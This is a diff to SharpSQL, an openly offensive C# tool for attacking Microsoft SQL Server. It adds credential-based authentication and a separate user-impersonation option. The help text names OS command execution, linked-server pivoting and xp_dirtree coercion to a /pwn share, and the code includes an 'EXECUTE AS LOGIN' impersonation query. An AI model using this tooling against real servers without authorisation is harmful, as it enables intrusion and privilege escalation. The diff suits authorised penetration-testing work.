@@ -19,7 +19,7 @@ SharpSQL by @mlcsec
 
 Usage:
 
-    SharpSQL.exe [Method] [-Instance <sql.server>] [-LinkedInstance <linked.sql.server>] [-Command <whoami>] [-Query <query>]
+    SharpSQL.exe [Method] [-Instance <sql.server>] [-LinkedInstance <linked.sql.server>] [-User <user> -Password <password>] [-Command <whoami>] [-Query <query>]
 
 Options:
 
@@ -27,9 +27,12 @@ Options:
     -db                        - The db to connect to (default: master)
     -LinkedInstance            - The linked instance to target
     -ip                        - The IP to xp_dirtree (share: /pwn)
-    -User                      - The user to impersonate
+    -User                      - SQL Server or domain account (""domain\user"") to authenticate with.
+    -Password                  - SQL Server or domain account password to authenticate with.
+    -Impersonate               - The database user to impersonate
     -Command                   - The command to execute (default: whoami - Invoke-OSCmd, Invoke-LinkedOSCmd, Invoke-ExternalScript, and Invoke-OLEObject)
     -Query                     - The raw SQL query to execute
+    -Verbose                   - Enable verbose output
     -help                      - Show help
 
 Methods:
@@ -82,9 +85,8 @@ Examples:
 
             foreach (string item in args)
             {
-                switch (item)
+                switch (item.ToLower())
                 {
-                    case "-Instance":
                     case "-instance":
                         Config.instance = args[iter + 1];
                         break;
@@ -92,23 +94,30 @@ Examples:
                         Config.ip = args[iter + 1];
                         break;
                     case "-db":
+                    case "-database":
                         Config.db = args[iter + 1];
                         break;
-                    case "-LinkedInstance":
                     case "-linkedinstance":
                         Config.linkedinstance = args[iter + 1];
                         break;
-                    case "-User":
                     case "-user":
                         Config.user = args[iter + 1];
                         break;
-                    case "-Command":
+                    case "-password":
+                    case "-pw":
+                        Config.password = args[iter + 1];
+                        break;
+                    case "-impersonate":
+                        Config.impersonate = args[iter + 1];
+                        break;
                     case "-command":
                         Config.command = args[iter + 1];
                         break;
-                    case "-Query":
                     case "-query":
                         Config.query = args[iter + 1];
+                        break;
+                    case "-verbose":
+                        Config.verbose = true;
                         break;
                     default:
                         break;
@@ -234,15 +243,34 @@ Examples:
 
         private static void _GetSQLConnectionTest(String instance)
         {
-            Console.WriteLine("Trying instance: " + instance + " ...");
             // from PowerUpSQL.ps1:182
             // $Connection.ConnectionString = "Server=$DacConn$Instance;Database=$Database;Integrated Security=SSPI;Connection Timeout=$TimeOut$AppNameString$EncryptString$TrustCertString$WorkstationString"
-            String connection_string = "Server=" + instance + ";Database=Master;Integrated Security=SSPI;";
-            SqlConnection connection = new SqlConnection(connection_string);
+
+            string conStr = "";
+            if (string.IsNullOrEmpty(Config.user))
+            {
+                if (Config.verbose) Console.WriteLine("[i] AuthenticationType = \"Current Windows Credentials\"");
+                conStr = $"Server = {instance}; Database = {Config.db}; Integrated Security = SSPI;";
+            }
+            else
+            {
+                if (Config.user.Contains('\\'))
+                {
+                    if (Config.verbose) Console.WriteLine("[i] AuthenticationType = \"Provided Windows Credentials\"");
+                    conStr = $"Server = {instance}; Database = {Config.db}; Integrated Security = SSPI;uid={Config.user};pwd={Config.password}";
+                }
+                else
+                {
+                    if (Config.verbose) Console.WriteLine("[i] AuthenticationType = \"Provided SQL Login\"");
+                    conStr = $"Server = {instance}; Database = {Config.db};User Id={Config.user};Password={Config.password}";
+                }
+            }
+
+            SqlConnection con = new SqlConnection(conStr);
 
             try
             {
-                connection.Open();
+                con.Open();
                 Console.WriteLine("[+] Access successful!");
             }
             catch
@@ -290,8 +318,29 @@ Examples:
                 return;
             }
 
+            /////////////////////////////////////////////////////////////////////////////////////////////////////
+            // Authentication
 
-            string conStr = $"Server = {Config.instance}; Database = {Config.db}; Integrated Security = SSPI;";
+            string conStr = "";
+            if (string.IsNullOrEmpty(Config.user))
+            {
+                if (Config.verbose) Console.WriteLine("[i] AuthenticationType = \"Current Windows Credentials\"");
+                conStr = $"Server = {Config.instance}; Database = {Config.db}; Integrated Security = SSPI;";
+            }
+            else
+            {
+                if (Config.user.Contains('\\'))
+                {
+                    if (Config.verbose) Console.WriteLine("[i] AuthenticationType = \"Provided Windows Credentials\"");
+                    conStr = $"Server = {Config.instance}; Database = {Config.db}; Integrated Security = SSPI;uid={Config.user};pwd={Config.password}";
+                }
+                else
+                {
+                    if (Config.verbose) Console.WriteLine("[i] AuthenticationType = \"Provided SQL Login\"");
+                    conStr = $"Server = {Config.instance}; Database = {Config.db};User Id={Config.user};Password={Config.password}";
+                }
+            }
+
             SqlConnection con = new SqlConnection(conStr);
 
             try
@@ -463,7 +512,7 @@ Examples:
 
             else if (string.Equals(command, "Invoke-UserImpersonation", StringComparison.CurrentCultureIgnoreCase))
             {
-                if (string.IsNullOrEmpty(Config.user) || (string.IsNullOrEmpty(Config.query)))
+                if (string.IsNullOrEmpty(Config.impersonate) || (string.IsNullOrEmpty(Config.query)))
                 {
                     Console.WriteLine("[!] No user or query supplied!");
                     Console.WriteLine("Usage: SharpSQL.exe Invoke-UserImpersonation -Instance sql.server -User sa -Query 'select user_name()'");
@@ -472,7 +521,7 @@ Examples:
 
                 else
                 {
-                    string query = executeQuery($"EXECUTE AS LOGIN = '{Config.user}';", con);
+                    string query = executeQuery($"EXECUTE AS LOGIN = '{Config.impersonate}';", con);
                     query = executeQuery($"{Config.query};", con);
                     Console.WriteLine("[*] Invoke-UserImpersonation: ");
                     Console.WriteLine($"{query}");
